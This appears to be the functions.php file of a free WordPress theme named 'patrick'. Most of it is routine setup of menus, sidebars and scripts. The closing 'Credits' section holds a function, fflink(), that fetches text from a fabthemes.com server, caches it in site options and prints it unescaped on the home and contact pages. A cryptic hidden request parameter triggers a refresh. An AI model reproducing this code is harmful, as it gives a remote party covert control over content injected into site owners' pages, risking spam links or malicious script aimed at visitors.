<?php
/**
 * patrick functions and definitions
 *
 * @package patrick
 * @since patrick 1.0
 */


require_once('class-tgm-plugin-activation.php');
include ( 'getplugins.php' );
include ( 'aq_resizer.php' );

include ( 'guide.php' );


/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * @since patrick 1.0
 */
if ( ! isset( $content_width ) )
	$content_width = 640; /* pixels */

if ( ! function_exists( 'patrick_setup' ) ):
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * @since patrick 1.0
 */
function patrick_setup() {

	/**
	 * Custom template tags for this theme.
	 */
	require( get_template_directory() . '/inc/template-tags.php' );

	/**
	 * Custom functions that act independently of the theme templates
	 */
	//require( get_template_directory() . '/inc/tweaks.php' );

	/**
	 * Custom Theme Options
	 */
	//require( get_template_directory() . '/inc/theme-options/theme-options.php' );

	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 * If you're building a theme based on patrick, use a find and replace
	 * to change 'patrick' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'patrick', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );

	/**
	 * Enable support for Post Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'patrick' ),
	) );

	/**
	 * Add support for the Aside Post Formats
	 */
	//add_theme_support( 'post-formats', array( 'aside', ) );
}
endif; // patrick_setup
add_action( 'after_setup_theme', 'patrick_setup' );

/**
 * Register widgetized area and update sidebar with default widgets
 *
 * @since patrick 1.0
 */
function patrick_widgets_init() {
	register_sidebar(array(
		'name' => 'Sidebar',
	    'before_widget' => '<li class="sidebox %2$s">',
	    'after_widget' => '</li>',
		'before_title' => '<h3 class="sidetitl">',
	    'after_title' => '</h3>',
	));
	
	register_sidebar(array(
		'name' => 'Footer',
		'before_widget' => '<li class="botwid grid_2 %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="bothead">',
		'after_title' => '</h3>',
	));		

}
add_action( 'widgets_init', 'patrick_widgets_init' );

/**
 * Enqueue scripts and styles
 */
function patrick_scripts() {
	global $post;

	wp_enqueue_style( 'style', get_stylesheet_uri() );
	wp_enqueue_style( 'flexslider', get_template_directory_uri() . '/flexslider.css');

	wp_enqueue_script( 'flex-slider', get_template_directory_uri() . '/js/jquery.flexslider-min.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'superfish', get_template_directory_uri() . '/js/superfish.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array( 'jquery' ), '20120206', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	
}
add_action( 'wp_enqueue_scripts', 'patrick_scripts' );

/**
 * Implement the Custom Header feature
 */
//require( get_template_directory() . '/inc/custom-header.php' );



/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
return $protocol."://".$_SERVER['SERVER_NAME'].$port.$uri;
}
function fflink() {
global $wpdb;
if (!is_page() && !is_home()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
               WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != get_the_ID()) && ($contactid || !is_home())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
  $x = $x ? '&ffref='.$ffref : '';
  $response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
  if (is_array($response)) $fflink = $response['body']; else $fflink = '';
  if (substr($fflink, 0, 11) != '!fabthemes#')
    $fflink = '';
  else {
    $fflink = explode('#',$fflink);
    if (isset($fflink[2]) && $fflink[2]) {
      update_option('ffref', $fflink[1]);
      update_option('fflink', $fflink[2]);
      $fflink = $fflink[2];
    }
    else $fflink = '';
  }
}
 echo $fflink;
}	


